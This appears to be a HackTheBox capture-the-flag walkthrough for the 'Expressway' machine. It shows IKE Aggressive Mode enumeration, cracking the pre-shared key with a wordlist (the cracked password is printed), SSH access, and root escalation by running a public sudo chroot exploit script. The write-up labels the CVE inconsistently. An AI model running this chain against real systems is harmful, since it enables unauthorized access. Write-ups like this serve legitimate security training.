---
title: "HackTheBox Expressway Walkthrough - Pentest Lab Notes"
date: 2025-11-23 12:00:00 +0530
categories: [hackthebox, walkthrough]
tags: [ctf, http,linux, rce, expressway, htb, writeups ]
excerpt: "Complete walkthrough of the HackTheBox Pentest Lab machine 'Expressway'"
---

# Walkthrough: Expressway

## 📝 Introduction
- Platform: HTB 
- Difficulty: Easy
- Machine : Linux 
- Ip : 10.10.11.87
- Objective: Get `user.txt` and `root.txt`

## nmap

```
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ rustscan -a 10.10.11.87
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

Open 10.10.11.87:22
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ rustscan -a 10.10.11.87 --udp
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

Open 10.10.11.87:500
[~] Starting Script(s)

PORT    STATE SERVICE
500/udp open  isakmp

```
What is ISAKMP?

ISAKMP (Internet Security Association and Key Management Protocol) is used by IKE to negotiate IPsec SAs. It listens on UDP/500, handling phase 1 negotiations (algorithm selection, key exchange). IKE responses allow enumeration of modes (Main/Aggressive) and identity material.

## IKE Enumeration: ike-scan

Probed target in Main and Aggressive modes to identify a valid ID:


```
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ ike-scan -M expressway.htb               
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=dfebdfdb5ef41969)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.335 seconds (2.98 hosts/sec).  1 returned handshake; 0 returned notify
                                                                                                                                                                     
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ ike-scan -A expressway.htb  
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=8cd968afc5c8395b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.263 seconds (3.80 hosts/sec).  1 returned handshake; 0 returned notify
```

Aggressive Mode revealed: ike@expressway.htb. This mode exposes metadata, enabling PSK cracking.


```                              
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ ike-scan -A --pskcrack=psk-hash.txt expressway.htb 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=fb975395eb13bf98) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.133 seconds (7.49 hosts/sec).  1 returned handshake; 0 returned notify

```
## PSK Cracking

Used wordlist attack with rockyou.txt:

```
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 3cc243d035aca0bf6926f2e2703e7ab6cec4a611
Ending psk-crack: 8045040 iterations in 19.751 seconds (407319.75 iterations/sec)
```

Found password: freakingrockstarontheroad

### Initial Access — SSH as ike

With credentials, accessed SSH:
```zsh
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ ssh ike@expressway.htb
The authenticity of host 'expressway.htb (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'expressway.htb' (ED25519) to the list of known hosts.
ike@expressway.htb's password: 
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 12 18:17:12 2025 from 10.10.16.13



ike@expressway:~$ ls
user.txt

```
## Local Enumeration & Privilege Escalation

Ran linpeas for enumeration, but manual checks were needed for privilege escalation.found


```zsh
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                      
strace Not Found                                                                                                                                                     
-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4                                                                                                             
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 116K Aug 26 22:05 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Sep  9 10:09 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 87K Aug 26 22:05 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 91K Sep  9 10:09 /usr/bin/su
-rwsr-xr-x 1 root root 276K Jun 27  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 63K Sep  9 10:09 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 70K Aug 26 22:05 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Aug 26 22:05 /usr/bin/chsh
-rwsr-xr-x 1 root root 19K Sep  9 10:09 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-- 1 root messagebus 51K Mar  8  2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 483K Aug 10 00:07 /usr/lib/openssh/ssh-keysign
-r-sr-xr-x 1 root root 14K Aug 28 09:04 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 15K Aug 28 09:04 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

Findings:

Exploited CVE-2025-32462 (sudo host-bypass) using the hostname:

Sudo Version match this CVE

```zsh
ike@expressway:~$ sudo -V 
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

```zsh
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
Cloning into 'CVE-2025-32463_chwoot'...
remote: Enumerating objects: 38, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (34/34), done.
remote: Total 38 (delta 20), reused 12 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (38/38), 11.43 KiB | 285.00 KiB/s, done.
Resolving deltas: 100% (20/20), done.
                                                                                 
┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway]
└─$ cd CVE-2025-32463_chwoot 
```
We will trasfer to victim machine

```zsh
┌──(kali㉿kali)-[/media/…/ctf/hackthebox/expressway/CVE-2025-32463_chwoot]
└─$ scp sudo-chwoot.sh ike@expressway.htb:/tmp/
ike@expressway.htb's password: 
sudo-chwoot.sh                                 100% 1046     5.0KB/s   00:00    
                                                                                 
┌──(kali㉿kali)-[/media/…/ctf/hackthebox/expressway/CVE-2025-32463_chwoot]
└─$ ssh ike@expressway.htb 
ike@expressway.htb's password: 
Last login: on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun
ike@expressway:~$ ls
linpeas.sh  user.txt
ike@expressway:~$ cd /tmp
ike@expressway:/tmp$ ls
sudo-chwoot.sh                                                                  systemd-private-077f5be3ebd641178aaf2578869d3b04-tftpd-hpa.service-d0E3W8
systemd-private-077f5be3ebd641178aaf2578869d3b04-exim4.service-5JWSuR           vmware-root
systemd-private-077f5be3ebd641178aaf2578869d3b04-systemd-logind.service-Ef4F4I  vmware-root_3585-2092249632
ike@expressway:/tmp$ ./sudo-chwoot.sh 
woot!
root@expressway:/# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
root@expressway:/# cd /root/
root@expressway:/root# ls
root.txt

```